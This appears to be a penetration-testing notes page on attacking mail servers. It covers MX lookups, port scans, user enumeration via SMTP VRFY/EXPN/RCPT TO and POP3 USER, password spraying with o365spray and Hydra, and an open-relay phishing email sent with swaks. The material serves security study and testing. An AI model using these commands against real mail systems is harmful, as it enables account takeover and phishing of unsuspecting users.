# SMTP 

A mail server is a server that handles and delivers email over a network. When we press the Send button in our email application (email client), the program establishes a connection to an SMTP server on the network or Internet. The name **SMTP** stands for **Simple Mail Transfer Protocol**, and it is a protocol for delivering emails from clients to servers and from servers to other servers. 

When we download emails to our email application, it will connect to a **POP3** or **IMAP4** server on the Internet, which allows the user to save messages in a server mailbox and download them periodically. By default, POP3 clients remove downloaded messages from the email server. On the other hand, by default, IMAP4 clients do not remove downloaded messages from the email server. 

We can use the **Mail eXchanger** (**MX**) DNS record to identify a mail server. We can use tools such as host or dig and online websites such as MXToolbox to query information about the MX records:
```console
zero@pio$  host -t MX <TARGET>
zero@pio$ host -t A <TARGET>
```

```console
zero@pio$ dig mx <TARGET> | grep "MX" | grep -v ";"
```

We can enumerate the following ports:

| **Port**   | **Service**    |
|--------------- | --------------- |
| `TCP/25` | SMTP Unencrypted |
| `TCP/143` | IMAP4 Unencrypted |
| `TCP/110` | POP3 Unencrypted |
| `TCP/465` |	SMTP Encrypted |
| `TCP/993` | IMAP4 Encrypted |
| `TCP/995` | POP3 Encrypted |

```console
zero@pio$ sudo nmap -Pn -sVC -p25,143,110,465,993,995 <TARGET>
```

## Authentication 

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.
```console
zero@pio$ telnet <TARGET> 25

...
VRFY root

252 2.0.0 root
```

`EXPN` is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as *all*.
```console
zero@pio$ telnet <TARGET> 25

...
EXPN john

250 2.1.0 john@target.pwn 

EXPN support-team

250 2.0.0 carol@target.pwn
250 2.1.5 elisa@target.pwn
```

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
```console
zero@pio$ telnet <TARGET> 25

MAIL FROM:test@target.pwn
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown

RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exits on the server.
```console
zero@pio$ telnet <TARGET> 110 

USER julio

-ERR


USER john

+OK
```

We can use the [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) tool to help us:
```console
zero@pio$ smtp-user-enum -M RCPT -U <USERLIST> -D <DOMAIN> -t <TARGET>
```

> More info [here](https://zeropio.github.io/notes/system/enumeration#smtp).
{: .prompt-tip}

The tool [o365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365). 
```console
zero@pio$ python3 o365spray.py --validate --domain <TARGET>

...
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: <TARGET>
```

Now, we can attempt to identify usernames:
```console
zero@pio$ python3 o365spray.py --enum -U <USER LIST> --domain <TARGET>   
```

We can use Hydra to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for POP3:
```console
zero@pio$ hydra -L <USER LIST> -p '<PASSWORD>' -f <TARGET> pop3
```

These tools are usually blocked. We can use o365spray, [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.
```console
zero@pio$ python3 o365spray.py --spray -U <USER LIST> -p '<PASSWORD>' --count 1 --lockout 1 --domain <DOMAIN>
```

## Protocol Specifics Attacks 

### Open Relay 

With the **nmap smtp-open-relay** script, we can identify if an SMTP port allows an open relay:
```console
zero@pio$ nmap -p25 -Pn --script smtp-open-relay <TARGET>
```

Next, we can use any mail client to connect to the mail server and send our email:
```console
zero@pio$ swaks --from notifications@target.pwn --to employees@target.pwn --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server <TARGET>
```
